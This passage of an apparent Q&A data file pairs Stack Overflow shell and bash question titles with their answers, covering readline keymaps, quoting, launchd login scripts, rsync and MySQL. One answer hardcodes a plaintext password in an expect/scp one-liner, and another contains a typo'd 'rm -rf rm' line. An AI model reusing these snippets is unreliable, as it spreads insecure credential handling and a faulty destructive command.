-l\n28\n+ravi@boxy:~/lib/readline$\nemacs/emacs-standard is basically a superset of vi-insert. So for typing text, it's best to use the emacs-standard keymap over vi-insert as long as you can easily switch between emacs and vi-command.\nThe only additional bindings in vi-insert not in emacs-standard are:\n+ravi@boxy:~/lib/readline$ comm -23 vi-insert emacs-standard \n\"\\C-d\": vi-eof-maybe\n\"\\C-n\": menu-complete\n\"\\C-p\": menu-complete-backward\n\"\\e\": vi-movement-mode\nThe first 3 of these four conflict with emacs bindings:\n\"\\C-d\": delete-char\n\"\\C-n\": next-history\n\"\\C-p\": previous-history\nwhich I resolved as follows:\nset keymap emacs\n\"\\e\": \"kj\" # see https://unix.stackexchange.com/questions/303631/how-can-i-setup-a-hybrid-readline-with-emacs-insert-mode-and-vi-command-mode\n\"\\C-d\": delete-char # eof-maybe: ^D does nothing if there is text on the line\n\"\\C-n\": menu-complete\n\"\\C-p\": menu-complete-backward\n\"\\C-y\": previous-history # historY\n\"\\e\\C-y\": previous-history\nediting-mode vi\nAs we saw above, vi, vi-command and vi-move are one and the same keymap:\n+ravi@boxy:~$ diff <(bind -pm vi) <(bind -pm vi-move)\n+ravi@boxy:~$ \nNote that's a total of just two distinct maps which are associated by default with editing-mode vi.\nWhen in editing-mode vi, the keymaps in use are vi/vi-command/vi-move and vi-insert (the starting keymap). Only one of these two maps is active at a time.\nediting-mode vi does nothing more than set a default keymap when the shell starts, labelled vi-insert. Again, tthere is only one keymap active at a time. This vi-insert keymap maps most keys to self-insert so when you press the plastic button on your keyboard, the symbol printed on it appears on your screen.\nThe vi-insert keymap allows itself to be swapped to the text-manipulating keymap called vi-command/vi/vi-move by using vi-movement-mode command, bound to the ESC key by default in the vi-insert keymap.\nActually, even the emacs keymap can set the vi-like text manipulation keymap active by using the vi-movement-mode command, as in the hybrid solution mentioned above.\nOr in easier language...\nBy default, press ESC to change to the vi-command keymap when the vi-insert keymap is active.\nThe vi-command keymap uses standard, single keypresses like a, b and c to move and interact with text, just like the vi editor's default or command mode. There are generally no Ctrl+key combinations. You can't insert text in this mode; the letter keys are mapped to editing/moving commands. For typing text, you switch to the vi-insert keymap (example: press i for \"Insert\").\nEntering text is done using the the vi-insert keymap, which is active when the shell starts if you have editing-mode vi in your .inputrc file. Swap to the vi-insert keymap by pressing i for \"insert\" while in vi-command (or in numerous other ways for those initiated into vi).\nUnless you know the vi editor, you'll probably find vi-command keys very hard to use at first, but if you get good at it, you can edit text like a long-bearded wizard.",
    "echo that shell-escapes arguments [duplicate]": "With bash, the printf builtin has an additional format specifier %q, which prints the corresponding argument in a friendly way:\nIn addition to the standard printf(1) formats, %b causes printf to expand backslash escape sequences in the corresponding argument (except that \\c terminates output, backslashes in \\', \\\", and \\? are not removed, and octal escapes beginning with \\0 may contain up to four digits), and %q causes printf to output the corresponding argument in a format that can be reused as shell input.\nSo you can do something like this:\nprintf %q \"$VARIABLE\"\nprintf %q \"$(my_command)\"\nto get the contents of a variable or a command's output in a format which is safe to pass in as input again (i.e. spaces escaped). For example:\n$ printf \"%q\\n\" \"foo bar\"\nfoo\\ bar\n(I added a newline just so it'll be pretty in an interactive shell.)",
    "Emacs: Terminal vs shell?": "Running a term buffer is much closer to an actual terminal. Here are a few differences:\nShell mode provides very limited terminal emulation. Programs that take advantage of the terminal's full-screen capabilities (e.g. less, mtr, mutt, top) won't work properly. Terminal mode will generally handle these without any problem.\nIn shell mode, emacs provides tab completion. In terminal mode, the shell or command-line program provide it themselves.\nShell mode buffers the input and sends it to the process on newline. Terminal mode sends the characters to the running process immediately.\nShell mode works like a regular buffer with the usual emacs key bindings. Terminal mode doesn't intercept most control characters unless you explicitly put it into line mode.",
    "writing Unicode-aware one-liners in Perl": "Yes, loading the utf8 pragma is required to interpret the \u201c\u30d5\u201d UTF\u20118 sequence in the source code as a character instead as separate bytes.\nThe Perl -C command-line switch and the utf8 pragma are locale-independent, but the shell\u2019s echo command is not.",
    "Emacs ido-style shell": "Since I also wanted something like this, I tried to implement it as a bash completion function. Obviously it means. you have to use bash.\nIt is only lightly tested, so please feel free to try and report bugs /comments.\nhttp://pgas.freeshell.org/shell/bash-ido",
    "What does the \"=~\" operator do in shell scripts?": "It's a bash-only addition to the built-in [[ command, performing regexp matching. Since it doesn't have to be an exact match of the full string, the symbol is waved, to indicate an \"inexact\" match.\nIn this case, if $LC_CTYPE CONTAINS the string \"UTF\".\nMore portable version:\nif test `echo $LC_CTYPE | grep -c UTF` -ne 0 -a \"$TERM\" != \"linux\"\nthen\n  ...\nelse\n  ...\nfi",
    "How to run SWI-Prolog from the command line?": "ISO directive: initialization. This should work.\n:- initialization main.\n\nmain :-\n  write('Hello World\\n').\nedit sorry, I skipped over most interesting details. Here is a sample script, let's say saved in ~/test/main.pl\n#!/home/carlo/bin/swipl -f -q\n\n:- initialization main.\n\nmain :-\n  current_prolog_flag(argv, Argv),\n  format('Hello World, argv:~w\\n', [Argv]),\n  halt(0).\nand made executable with\nchmod +x ~/test/main.pl\nthen I get\n~$ ~/test/main.pl\nHello World, argv:[]\n\n~$ ~/test/main.pl as,dnj asdl\nHello World, argv:[as,dnj,asdl]\nIn script main.pl, I used the swipl path that results from building from source without admin privileges. The SWI-Prolog build process put bin and lib under ~/bin and ~/lib\nNote: the -f flag disables loading the initialization ~/.plrc, and this could be necessary to get more 'strict control' over execution...\nI'm currently unsure if the documentation page is up-to-date with current SW status. From some mailing list message, and my own efforts to reuse thea, seems that command line flags changed recently...",
    "How to run NVM command from bash script": "One of the advantages of nvm is that you don't need to use sudo to install versions or to switch to another version. I'm not sure why you are using sudo in your nvm command.\nThe problem, as others have also said, is that the version is changed in a sub-shell. So the version in your \"real\" shell is not changed.\nYou can accomplish this by running your script with . (dot space) in front of it. That will make the script to be able to change stuff in your current shell.\nThis is my ~/bin/nvm-use-4 script:\n. /usr/local/opt/nvm/nvm.sh\nnvm use 4\nAnd using it:\nprawie:~$ nvm current\nv0.10.29\nprawie:~$ . nvm-use-4\nNow using node v4.2.1\nprawie:~$ nvm current\nv4.2.1\nIf you are forced to use sudo here, I don't think it's possible to accomplish what you want, because the sudo'ed command is run in a sub-shell.\nUnfortunately, you have not told use why you want to do this or what you want to accomplish. There could be better solutions to solve your problem. For example, if you want to always use a specific version of node.js when you open a new shell, you could add the following line to .profile, .bashrc or equivalent file:\nnvm use 0.12.7",
    "What is a convention for naming a constant in Bash?": "Together with the question you are linking, there is another related question in Unix & Linux: Are there naming conventions for variables in shell scripts?.\nThere you can find a couple of good answers:\nVariables that are introduced by the operating system or start up scripts etc. are usually all in CAPITALS, these are called 'envrironment variables'.\nTo prevent your own variables from conflicting with environment variables, it is a good practice to use lower case.\nTogether with a Shell Style Guide link, where you can find:\nNaming Conventions\nFunction Names\n\u25b6 Lower-case, with underscores to separate words. Separate libraries with ::. Parentheses are required after the function name. The keyword function is optional, but must be used consistently throughout a project.\nVariable Names\n\u25b6 As for function names.\nConstants and Environment Variable Names\n\u25b6 All caps, separated with underscores, declared at the top of the file.\nThere is no suggested convention in man bash, just note the \"be careful with uppercase\" warning.",
    "Bash: stop on error in sourced script": "It's impossible. However you can opt to use a subshell if you want:\n(\n    set -e\n    source another.sh\n)\nOnly that environment of calling script can never be altered by the called script.\nNote: It may be important to separate both commands with newline and not use a semicolon.",
    "How to get expect -c to work in single line rather than script": "Got it: The following code scps a file called Sean_Lilly.zip from my box to another box without entering a password:\nexpect -c \"spawn /usr/bin/scp Sean_Lilly.zip adaptive@10.10.12.17:/opt/ams/epf_3_4/Sean_Lilly.zip; sleep 5; expect -re \\\"password\\\"; send \\\"ad\\r\\n\\\"; set timeout -1; expect -re \\\"100%\\\";\"\nI know this can be done by setting passwordless ssh access between the two boxes but I wanted to do it in one command line using expect. Thanks fuzzy lollipop for the inspiration. Note if you run expect -d -c \"spawn ... you get excellent debug on what is happening including whether your regex is good enough",
    "WordCount: how inefficient is McIlroy's solution?": "The Unix script has a few linear operations and 2 sorts. It will be calculation order O(n log(n)).\nFor Knuth algorithm for taking only the top N: http://en.wikipedia.org/wiki/Selection_algorithm Where you can have a few options in time and space complexity of the algorithm, but theoretically they can be faster for some typical examples with large number of (different) words.\nSo Knuth could be faster. Certainly because the English dictionary has limited size. It could turn log(n) in some large constant, though maybe consuming a lot of memory.\nBut maybe this question is better suited for https://cstheory.stackexchange.com/",
    "How to append a newline after every match using xmlint --xpath": "Hello from the year 2020!\nAs of v2.9.9 of libxml, this behavior has been fixed in xmllint itself.\necho \\\n'<textarea name=\"command\" class=\"setting-input fixed-width\"\n rows=\"9\">1</textarea>\n<textarea name=\"command\" class=\"setting-input fixed-width\"\n rows=\"5\">2</textarea>' \\\n  | xmllint --xpath '//textarea[@name=\"command\"]/text()' --html -\n\n# result:\n# 1\n# 2\nHowever, if you're using anything older than that, and don't want to build libxml from source just to get the fixed xmllint, you'll need one of the other workarounds here. As of this writing, the latest CentOS 8, for example, is still using a version of libxml (2.9.7) that behaves the way the OP describes.\nAs I gather from this SO answer, it's theoretically possible to feed a command into the --shell option of older (<2.9.9) versions of xmllint, and this will produce each node on a separate line. However, you end up having to post-process it with sed or grep to remove the visual detritus of shell mode's (human-oriented) output. It's not ideal.\nXMLStarlet, if available, offers another solution, but you do need to use xmlstarlet fo to format your HTML fragment into valid XML before using xmlstarlet sel to extract nodes:\necho \\\n'<textarea name=\"command\" class=\"setting-input fixed-width\"\n rows=\"9\">1</textarea>\n<textarea name=\"command\" class=\"setting-input fixed-width\"\n rows=\"5\">2</textarea>' \\\n  | xmlstarlet fo -H -R \\\n  | xmlstarlet sel -T -t -v '//textarea[@name=\"command\"]' -n\nIf the Attempt to load network entity message from the second xmlstarlet invocation annoys you, just add 2>/dev/null at the very end to suppress it (at the risk of suppressing other messages printed to standard error).\nThe XMLStarlet options explained (see also the user's guide):\nfo -H -R \u2014 format the output, expecting HTML input, and recovering as much bad input as possible\nthis will add an <html> root node, making the fragment in the OP's example valid XML\nsel -T -t -v //xpath -n \u2014 select nodes based on XPath //xpath\noutput plain text (-T) instead of XML\nusing the given template (-t) that returns the value (-v) of the node rather than the node itself (allowing you to forgo using text() in the XPath expression)\nfinally, add a newline (-n)\nEdit(s): Removed half-implemented xmllint --shell solution because it was just bad. Added an XMLStarlet example that actually works with the OP's data.",
    "Implications of LC_ALL=C to speedup grep": "You don't necessarily need UTF-8 to run into trouble here. The locale is responsible for setting the character classes, i.e. determining which character is a space, a letter or a digit. Consider these two examples:\n$ echo -e '\\xe4' | LC_ALL=en_US.iso88591 grep '[[:alnum:]]' || echo false\n\u00e4\n$ echo -e '\\xe4' | LC_ALL=C grep '[[:alnum:]]' || echo false\nfalse\nWhen trying to match exact binary patterns against each other, the locale doesn't make a difference, however:\n$ echo -e '\\xe4' | LC_ALL=en_US.iso88591 grep \"$(echo -e '\\xe4')\" || echo false\n\u00e4\n$ echo -e '\\xe4' | LC_ALL=C grep \"$(echo -e '\\xe4')\" || echo false\n\u00e4\nI'm not sure about the extent of grep implementing unicode, and how well different codepoints are matched to each other, but matching any subset of ASCII and the matching of single characters without alternate binary representations should work fine regardless of locale.",
    "Is it secure to store EC2 User-Data shell scripts in a private S3 bucket?": "",
    "Bash array: Unexpected Syntax error [closed]": "Variable assignments can't have a space around the = sign:\narray=( /a/b/  /c/d )\n     ^--no spaces \nare you sure?\nmarc@panic:~$ array =(a b)      \nbash: syntax error near unexpected token `('\nmarc@panic:~$ array= (a b)  \nbash: syntax error near unexpected token `('\nmarc@panic:~$ array = (a b)\nbash: syntax error near unexpected token `('\nmarc@panic:~$ array=(a b)  \nmarc@panic:~$ echo ${array[1]}\nb",
    "logrotate compress files after the postrotate script": "Adding this info here in case of anyone else that comes across this thread when actually searching for wanting a way to run a script on a file once compression has completed.\nAs suggested above using postrotate/endscript is no good for that.\nInstead you can use lastaction/endscript, which does the job perfectly.",
    "install .p12 or .cer in console macos": "It looks like you can do this using the import command. I've managed to do the following:\nsecurity create-keychain -p password bobbins.keychain\nsecurity add-certificates ./MyCertificate.cer\n\nsecurity unlock-keychain -p password bobbins.keychain\nsecurity import ./MyPrivateKey.p12 -k bobbins.keychain -P privateKeyPassword\nI found I had to unlock the keychain, otherwise it prompted for the keychain password.\nHope this helps.",
    "Run shell command in jenkins as root user?": "",
    "Getting parent's directory name by piping the results of dirname to basename in a Bash script": "$ echo 'test/90_2a5/Windows' | xargs dirname | xargs basename\n90_2a5",
    "Install mongo shell in mac": "From what I found on MongoDB HomeBrew, to install only the Mongo Shell you should use:\nbrew tap mongodb/brew\nAfter that, install the shell:\nbrew install mongosh\nFor reference, the example below is no longer recommended (deprecated in MongoDB 5.0 in 2021):\nbrew install mongodb-community-shell",
    "Check if rsync command ran successful": "Usually, any Unix command shall return 0 if it ran successfully, and non-0 in other cases.\nLook at man rsync for exit codes that may be relevant to your situation, but I'd do that this way :\n#!/bin/bash\nrsync -r -z -c /home/pi/queue root@server.mine.com:/home/foobar && rm -rf rm /home/pi/queue/* && echo \"Done\"\nWhich will rm and echo done only if everything went fine.\nOther way to do it would be by using $? variable which is always the return code of the previous command :\n#!/bin/bash\nrsync -r -z -c /home/pi/queue root@server.mine.com:/home/foobar\nif [ \"$?\" -eq \"0\" ]\nthen\n  rm -rf rm /home/pi/queue/*\n  echo \"Done\"\nelse\n  echo \"Error while running rsync\"\nfi\nsee man rsync, section EXIT VALUES",
    "Why can't I use 'sudo su' within a shell script? How to make a shell script run with sudo automatically": "You can use Here Documents to redirect input into an interactive shell script. The operator << is an instruction to read input until it finds a line containing the specified delimiter, as EOF (end of file).\nsudo su <<EOF\necho \"code\"\nEOF\ne.g.\n#!/bin/bash    \nsudo su <<EOF\nmkdir /opt/D3GO/\ncp `pwd`/D3GO /opt/D3GO/\ncp `pwd`/D3GO.png /opt/D3GO/\ncp `pwd`/D3GO.desktop /usr/share/applications/\nchmod +x /opt/D3GO/D3GO\nEOF",
    "Finding the max and min values and printing the line from a file": "For min value:\n[bash]$ cut -f1 -d\",\" file_name | sort -n | head -1\nFor max value:\n[bash]$ cut -f1 -d\",\" file_name | sort -n | tail -1",
    "Linux alias chain commands (can recursion be avoided?)": "If you put a backslash before the command name, that will disable any aliases.\nalias ls='clear;\\ls'\nOr, like Arnaud said, just use the full path for ls.",
    "Launch shell script on login in Mac OS (OS X)": "Ivan Kovacevic's pointers, especially the superuser.com link, are helpful; since at least OS X 10.9.2, your options for creating run-at-login scripts are:\nNote: The methods are annotated with respect to whether they are:\nspecific to a given user (\"[user-SPECIFIC]\"); i.e., the installation must be performed for each user, if desired; scripts are typically stored in a user-specific location, and root (administrative) privileges are NOT required for installation.\neffective for ALL users (\"[ALL users]\"); i.e., the installation takes effect for ALL users; scripts are typically stored in a shared location and root (administrative) privileges ARE required for installation.\nThe scripts themselves will run invisibly, but - with the exception of the com.apple.loginwindow login-hook method - you can open applications visibly from them; things to note:\nThere is no guarantee that any such application will be frontmost, so it may be obscured by other windows opened during login.\nIf you want to run another shell script visibly, simply use open /path/to/your-script, which will open it in Terminal.app; however, the Terminal window will automatically close when your script terminates.\nAutomator [user-SPECIFIC]:\nFile > New, type Application\nAdd a Run Shell Script action, which adds an embedded bash script, and either paste your script code there or add a command that invokes an existing script from there.\nSave the *.app bundle and add it to the Login Items list in System Preferences > User & Groups > Login Items.\nNote:\nThe embedded script runs with the default \"C\" locale.\n$PATH is fixed to /usr/bin:/bin:/usr/sbin:/sbin, which notably does NOT include /usr/local/bin\nThe working dir. is the current user's home directory.\ncom.apple.loginwindowlogin hook [ALL users - DEPRECATED, but still works]:\nIf you have admin privileges, this is the easiest method, but it is DEPRECATED, for a variety of reasons (security, limited to a single, shared script, synchronous execution); Apple especially cautions against use of this mechanism as part of a software product.\nPlace your script, e.g., Test.sh, in a shared location - e.g., /Users/Shared - and make sure it is executable (chmod +x /Users/Shared/Test.sh).\nFrom Terminal.app, run the following:\nsudo defaults write com.apple.loginwindow LoginHook /Users/Shared/Test.sh\nNote:\nThe script will run as the root user, so exercise due caution.\nAmong the methods listed here, this is the only way to run a script as root.\nThere's only one system-wide login hook.\nNote that there's also a log-OUT hook, LogoutHook, which provides run-at-logout functionality - unlike the other approaches.\nThe login-hook script runs synchronously before other login actions, and should therefore be kept short.\nNotably, it runs before the desktop is displayed; you cannot launch applications from the script, but you can create simple interactions via osascript and AppleScript snippets (e.g., osascript -e 'display dialog \"Proceed?\"'); however, any interactions block the login process.\nThe script runs in the context of the root user and he username of the user logging on is passed as the 1st argument to the script.\nThe script runs with the default \"C\" locale.\n$PATH is fixed to /usr/bin:/bin:/usr/sbin:/sbin, which notably does NOT include /usr/local/bin\nThe working dir. is /.\nlaunchd agents:\nlaunchd-agent-executed scripts can be installed for a SPECIFIC user OR for ALL users - the latter requires administrative privileges.\nWhile using launchd is Apple's preferred method, it's also the most cumbersome, as it requires creating a separate *.plist configuration file.\nOn the upside, you can install multiple scripts independently.\nNote:\nNo specific timing or sequencing of launchd scripts is guaranteed; loosely speaking, they \"run at the same time at login\"; there is even no guaranteed timing between the user-specific and the all-user tasks.\nThe script runs with the default \"C\" locale.\n$PATH is fixed to /usr/bin:/bin:/usr/sbin:/sbin, which notably does NOT include /usr/local/bin\nThe working dir. is / by default, but you can configure it via the .plist file - see below.\nThe script-file path must be specified as a full, literal path (e.g., /Users/jdoe/script.sh; notably , ~-prefixed paths do not work.\nFor a description of all keys that can be used in *.plist configuration files, see man launchd.plist.\nBoth user-specific and all-users tasks run as the current user (the user logging on).\nlaunchd [user-SPECIFIC]:\nNote: Lingon 3 ($5 as of early 2014) is a GUI application that facilitates the process below, but only for user-specific scripts.\nPlace your script, e.g., Test.sh, in your home folder, e.g., /Users/jdoe\nCreate a file with extension .plist in ~/Library/LaunchAgents, e.g., ~/Library/LaunchAgents/LoginScripts.Test.plist, by running the following in Terminal.app:\ntouch ~/Library/LaunchAgents/LoginScripts.Test.plist\nOpen the file and save it with the following content:\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n      <!-- YOUR SELF-CHOSEN *UNIQUE* LABEL (TASK ID) HERE -->\n    <string>LoginScripts.Test.sh</string>\n    <key>ProgramArguments</key>\n    <array>\n          <!-- YOUR *FULL, LITERAL* SCRIPT PATH HERE -->\n        <string>/Users/jdoe/Test.sh</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n</dict>\n</plist>\nThe <!-- ... --> comments indicate the places to customize; you're free to choose a label, but it should be unique - ditto for the .plist filename; for simplicity, keep the label and the filename root the same.\nFrom Terminal.app, run the following:\nlaunchctl load ~/Library/LaunchAgents/LoginScripts.Test.plist\nNote that, as a side effect, the script will execute right away. From that point on, the script will execute whenever the CURRENT user logs on.\nIt is not strictly necessary to run launchctl load -- since, by virtue of the file's location, it will be picked up automatically on next login -- but it's helpful for verifying that the file loads correctly.\nlaunchd [ALL users]\nPlace your script, e.g., Test.sh, in a SHARED location, e.g., /Users/Shared\nCreate a file with extension .plist in /Library/LaunchAgents (requires admin privileges), e.g., /Library/LaunchAgents/LoginScripts.Test.plist, by running the following in Terminal.app:\nsudo touch /Library/LaunchAgents/LoginScripts.Test.plist\nOpen the file and save it with the following content (make sure your text editor prompts for admin privileges on demand; alternatively, use sudo nano /Library/LaunchAgents/LoginScripts.Test.plist):\n<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n<dict>\n    <key>Label</key>\n      <!-- YOUR SELF-CHOSEN *UNIQUE* LABEL (TASK ID) HERE -->\n    <string>LoginScripts.Test.sh</string>\n    <key>ProgramArguments</key>\n    <array>\n          <!-- YOUR *FULL, LITERAL* SCRIPT PATH HERE -->\n        <string>/Users/Shared/Test.sh</string>\n    </array>\n    <key>RunAtLoad</key>\n    <true/>\n</dict>\n</plist>\nThe <!-- ... --> comments indicate the places to customize; you're free to choose a label, but it should be unique - ditto for the .plist filename; for simplicity, keep the label and the filename root the same.\nFrom Terminal.app, run the following:\nsudo chown root /Library/LaunchAgents/LoginScripts.Test.plist\nsudo launchctl load /Library/LaunchAgents/LoginScripts.Test.plist\nNote that, as a side effect, the script will execute right away. From that point on, the script will execute whenever ANY user logs on.\nIt is not strictly necessary to run launchctl load -- since, by virtue of the file's location, it will be picked up automatically on next login -- but it's helpful for verifying that the file loads correctly.",
    "How do you use ssh in a shell script?": "Depends on what you want to do, and how you use it. If you just want to execute a command remotely and safely on another machine, just use\nssh user@host command\nfor example\nssh user@host ls\nIn order to do this safely you need to either ask the user for the password during runtime, or set up keys on the remote host.",
    "How to use shell variables in perl command call in a bash shell script?": "Variables from the shell are available in Perl's %ENV hash. With bash (and some other shells) you need to take the extra step of \"exporting\" your shell variable so it is visible to subprocesses.\nmydate=10/10/2012\nexport mydate\nperl -e 'print \"my date is $ENV{mydate}\\n\"'",
    "Unix 'alias' fails with 'awk' command": "To complement's @Dropout's helpful answer:\ntl;dr\nThe problem is the OP's attempt to use ' inside a '-enclosed (single-quoted) string.\nThe most robust solution in this case is to replace each interior ' with '\\'' (sic):\nalias logspace='find /apps/ /opt/ -type f -size +100M -exec ls -lh {} \\; | \n                awk '\\''{print $5, $9 }'\\'''\nBourne-like (POSIX-compatible) shells do not support using ' chars inside single-quoted ('...'-enclosed) strings AT ALL - not even with escaping.\n(By contrast, you CAN escape \" inside a double-quoted string as \\\", and, as in @Droput's answer, you can directly, embed ' chars. there, but see below for pitfalls.)\nThe solution above effectively builds the string from multiple, single-quoted strings into which literal ' chars. - escaped outside the single-quoted strings as \\' - are spliced in.\nAnother way of putting it, as @Etan Reisinger has done in a comment: '\\'' means: \"close string\", \"escape single quote\", \"start new string\".\nWhen defining an alias, you usually want single quotes around its definition so as to delay evaluation of the command until the alias is invoked.\nOther solutions and their pitfalls:\nThe following discusses alternative solutions, based on the following alias:\nalias foo='echo A '\\''*'\\'' is born at $(date)'\nNote how the * is effectively enclosed in single quotes - using above technique - so as to prevent pathname expansion when the alias is invoked later.\nWhen invoked, this alias prints literal A * star is born, followed by the then-current date and time, e.g.: A * is born at Mon Jun 16 11:33:19 EDT 2014.\nUse a feature called ANSI C quoting with shells that support it: bash, ksh, zsh\nANSI C-quoted strings, which are enclosed in $'...', DO allow escaping embedded ' chars. as \\':\nalias foo=$'echo A \\'*\\' is born at $(date)'\nPitfalls:\nThis feature is not part of POSIX.\nBy design, escape sequences such as \\n, \\t, ... are interpreted, too (in fact, that's the purpose of the feature).\nUse of alternating quoting styles, as in @Dropout's answer:\nPitfall:\n'...' and \"...\" have different semantics, so substituting one for the other can have unintended side-effects:\nalias foo=\"echo A '*' is born at $(date)\" # DOES NOT WORK AS INTENDED\nWhile syntactically correct, this will NOT work as intended, because the use of double quotes causes the shell to expand the command substitution $(date) right away, and thus hardwires the date and time at the time of the alias definition into the alias.\nAs stated: When defining an alias, you usually want single quotes around its definition so as to delay evaluation of the command until the alias is invoked.\nFinally, a caveat:\nThe tricky thing in a Bourne-like shell environment is that embedding ' inside a single-quoted string sometimes - falsely - APPEARS to work (instead of generating a syntax error, as in the question), when it instead does something different:\n alias foo='echo a '*' is born at $(date)'  # DOES NOT WORK AS EXPECTED.\nThis definition is accepted (no syntax error), but won't work as expected - the right-hand side of the definition is effectively parsed as 3 strings - 'echo a ', *, and ' is born at $(date)', which, due to how the shell parses string (merging adjacent strings, quote removal), results in the following, single, literal string: a * is born at $(date). Since the * is unquoted in the resulting alias definition, it will expand to a list of all file/directory names in the current directory (pathname expansion) when the alias is invoked.",
    "Shell command to find files in a directory pattern": "find /path/to/directory/.  -path \"*/match/this/path/*\" -type f -name \"*.php\"",
    "-bash: [: =: unary operator expected. when no parameter given [duplicate]": "You would need to add quotes around $1.\nif [ \"$1\" = \"-r\" ]; then\n    echo \"I am here\"\nfi\nWhen $1 is empty you are getting if [ = \"-r\"] which is a syntax error.",
    "Numbering lines matching the pattern using sed": "You can use grep:\ngrep -n pattern file\nIf you use = in sed the line number will be printed on a separate line and is not available in the pattern space for manipulation. However, you can pipe the output into another instance of sed to merge the line number and the line it applies to.\nGNU sed:\nsed -n '/pattern/{=;p}' file | sed '{N;s/\\n/ /}'\nMacOS sed:\nsed -n -e '/pattern/{=' -e 'p' -e '}' file | sed -e '{N' -e 's/\\n/ /' -e '}'",
    "Shell shift procedure - What is this?": "Take a look at the man page, which says:\nshift [n]\n    The  positional parameters from n+1 ... are renamed to $1 .... \n    If n is not given, it is assumed to be 1.\nAn Example script:\n#!/bin/bash\necho \"Input: $@\"\nshift 3\necho \"After shift: $@\"\nRun it:\n$ myscript.sh one two three four five six\n\nInput: one two three four five six\nAfter shift: four five six\nThis shows that after shifting by 3, $1=four, $2=five and $3=six.",
    "How can I calculate pi using Bash command": "This calculates the value of \u03c0 using Gregory\u2013Leibniz series:\nseq -f '4/%g' 1 2 99999 generates the fractions:\n4/1\n4/3\n4/5\n4/7\n4/9\n4/11\n4/13\n4/15\n4/17\n4/19\nThe paste pipeline paste -sd-+ combines those with alternate delimiters - and +.\nFinally, bc -l performs the arithmetic to give the result.\nEDIT: As noted in the comment, this sequence converges very slowly. Machin's formula has a significantly higher rate of convergence:\nUsing the same expansion for tan-1(x):\nto compute \u03c0, we can see that it produces the correct value to 50 digits1 using just the first 50 terms of the series:\n$ { echo -n \"scale=50;\"; seq 1 2 100 | xargs -n1 -I{} echo '(16*(1/5)^{}/{}-4*(1/239)^{}/{})';} | paste -sd-+ | bc -l\n3.14159265358979323846264338327950288419716939937510\nWith just 100 terms, the value of \u03c0 is computed accurately to more than 100 digits:\n$ { echo -n \"scale=100;\"; seq 1 2 200 | xargs -n1 -I{} echo '(16*(1/5)^{}/{}-4*(1/239)^{}/{})';} | paste -sd-+ | bc -l\n3.1415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679\n1 Pi",
    "Sort a tab delimited file based on column sort command bash [duplicate]": "To sort on the fourth column use just the -k 4,4 selector.\nsort -t $'\\t' -k 4,4 <filename>\nYou might also want -V which sorts numbers more naturally. For example, yielding 1 2 10 rather than 1 10 2 (lexicographic order).\nsort -t $'\\t' -k 4,4 -V <filename>\nIf you're getting errors about the $'\\t' then make sure your shell is bash. Perhaps you're missing #!/bin/bash at the top of your script?",
    "Running a bash shell script in java": "You should use the returned Process to get the result.\nRuntime#exec executes the command as a separate process and returns an object of type Process. You should call Process#waitFor so that your program waits until the new process finishes. Then, you can invoke Process.html#getOutputStream() on the returned Process object to inspect the output of the executed command.\nAn alternative way of creating a process is to use ProcessBuilder.\nProcess p = new ProcessBuilder(\"myCommand\", \"myArg\").start();\nWith a ProcessBuilder, you list the arguments of the command as separate arguments.\nSee Difference between ProcessBuilder and Runtime.exec() and ProcessBuilder vs Runtime.exec() to learn more about the differences between Runtime#exec and ProcessBuilder#start.",
    "oh-my-zsh error after upgrade: ~/.oh-my-zsh/lib/misc.zsh:3: parse error near `then'": "Etan Reisner help me out with his commentary. \nYou need a space between the \" and the ]] in that if line.\nSo I just add a space :') and fix the warning! :P\nfor d in $fpath; do\n    if [[ -e \"$url/d-quote-magic\" ]]; then                                                                                                 \n        autoload -U url-quote-magic\n        zle -N self-insert url-quote-magic\n    fi\ndone\nThanks again! :)",
    "Python: subprocess call with shell=False not working": "You need to split the commands into separate strings:\nsubprocess.call([\"./rvm\", \"xyz\"], shell=False)\nA string will work when shell=True but you need a list of args when shell=False\nThe shlex module is useful more so for more complicated commands and dealing with input but good to learn about:\nimport shlex\n\ncmd = \"python  foo.py\"\nsubprocess.call(shlex.split(cmd), shell=False)\nshlex tut",
    "How to check if a file contains only zeros in a Linux shell?": "If you're using bash, you can use read -n 1 to exit early if a non-NUL character has been found:\n<your_file tr -d '\\0' | read -n 1 || echo \"All zeroes.\"\nwhere you substitute the actual filename for your_file.",
    "How can I drop all MySQL Databases with a certain prefix?": "The syntax of the DROP DATABASE statement supports only a single database name. You will need to execute a separate DROP DATABASE statement for each database.\nYou can run a query to return a list of database names, or maybe more helpful, to generate the actual statements you need to run. If you want to drop all databases that start with the literal string database_ (including the underscore character), then:\nSELECT CONCAT('DROP DATABASE `',schema_name,'` ;') AS `-- stmt`\n  FROM information_schema.schemata\n WHERE schema_name LIKE 'database\\_%' ESCAPE '\\\\'\n ORDER BY schema_name\nCopy the results from that query, and you've got yourself a SQL script.\n(Save the results as plain text file (e.g. dropdbs.sql), review with your favorite text editor to remove any goofy header and footer lines, make sure the script looks right, save it, and then from the mysql command line tool, mysql> source dropdbs.sql.)\nObviously, you could get more sophisticated than that, but for a one-time shot, this is probably the most efficient.)",
    "Check if bash script was invoked from a shell or another script/application": "Try this:\nps -o stat= -p $PPID\nIf the result contains \"s\" (lowercase) it was either run from the command line or backgrounded from within a script. To tell those two apart:\nps -o stat= -p $$\nwill contain a \"+\" if it was not backgrounded.\nHere's a table:\nRun          $$    $PPID\nCL           S+    Ss\nCL&          S     Ss+\nScript       S+    S+\nScript&      S     S\nScript(&)    S     Ss\nScript&(&)   S     NULL\nWhere (&) means the child script was backgrounded and & means the parent script (which is what \"Script\" refers to) that ran it was backgrounded. CL means command line. NULL means that ps output a null and that $PPID is \"1\".\nFrom man ps:\n   s    is a session leader\n   +    is in the foreground process group\nIt should be noted that this answer is based on GNU ps, but the man pages for BSD (including OS X) indicate similar functionality. And GNU ps is a hybrid that includes BSD functionality, among others.",
